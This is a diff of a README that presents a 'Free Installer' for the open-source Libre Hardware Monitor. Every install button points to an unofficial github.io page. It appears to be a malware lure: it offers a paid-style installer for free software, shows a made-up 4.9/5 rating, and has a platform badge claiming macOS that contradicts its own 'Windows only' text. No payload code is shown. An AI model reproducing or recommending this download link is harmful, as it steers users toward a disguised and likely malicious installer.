@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-System+Monitor-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Hardware+Monitor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Libre Hardware Monitor Free Installer** — Libre Hardware Monitor is a free, open-source hardware monitoring application for Windows that reads CPU temperatures, GPU temperatures, fan speeds, voltages, and load percentages. Works without internet access, no account required. Full offline installation.
+**💻 Libre Hardware Monitor Free Installer** — Libre Hardware Monitor is a free, open-source hardware monitoring application for Windows forked from Open Hardware Monitor. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Libre Hardware Monitor](https://img.shields.io/badge/⬇_Install_Libre%20Hardware%20Monitor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Libre Hardware Monitor](https://img.shields.io/badge/⬇_Install_Libre+Hardware+Monitor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Libre Hardware Monitor
 
-Libre Hardware Monitor is a free, open-source hardware monitoring application for Windows that reads CPU temperatures, GPU temperatures, fan speeds, voltages, and load percentages. It is a fork of Open Hardware Monitor with more frequent updates and broader hardware support.
+Libre Hardware Monitor is a free, open-source hardware monitoring application for Windows forked from Open Hardware Monitor. Monitor CPU, GPU, RAM, and drive temperatures, fan speeds, voltages, and clock speeds in real time. Display sensor readings in a desktop gadget or system tray overlay. Libre Hardware Monitor is maintained as an active alternative to the original abandoned Open Hardware Monitor.
 
 ---
 
 ## ❌ Problem: Libre Hardware Monitor is hard to access
 
-- **Windows Only** — No macOS or Linux version; use lm-sensors on Linux instead
-- **Driver Conflicts** — Anti-cheat software can block hardware sensor access
-- **Limited Alerting** — No built-in notifications when temperatures exceed thresholds
-- **Technical Display** — Raw sensor data can be confusing without hardware knowledge
+- **Windows Only** — No macOS or Linux version
+- **Driver Requirements** — Some sensor readings require running with administrator privileges
+- **Accuracy Variation** — Sensor accuracy depends on motherboard and component quality
+- **Interface Design** — Functional but dated tree-view interface
 
 ---
 
@@ -81,7 +81,7 @@ Libre Hardware Monitor is a free, open-source hardware monitoring application fo
 
 <div align="center">
 
-[![⬇ Install Libre Hardware Monitor](https://img.shields.io/badge/⬇_Install_Libre%20Hardware%20Monitor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Libre Hardware Monitor](https://img.shields.io/badge/⬇_Install_Libre+Hardware+Monitor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Libre Hardware Monitor is a free, open-source hardware monitoring application fo
 
 ---
 
-**Libre Hardware Monitor Free Installer** — Libre Hardware Monitor is a free, open-source hardware monitoring application for Windows that reads CPU temperatures, GPU temperatures, fan speeds, voltages, and load percentages. Install without internet connection today!
+**Libre Hardware Monitor Free Installer** — Libre Hardware Monitor is a free, open-source hardware monitoring application for Windows forked from Open Hardware Monitor. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Libre Hardware Monitor](https://img.shields.io/badge/⬇_Install_Libre%20Hardware%20Monitor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Libre Hardware Monitor](https://img.shields.io/badge/⬇_Install_Libre+Hardware+Monitor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
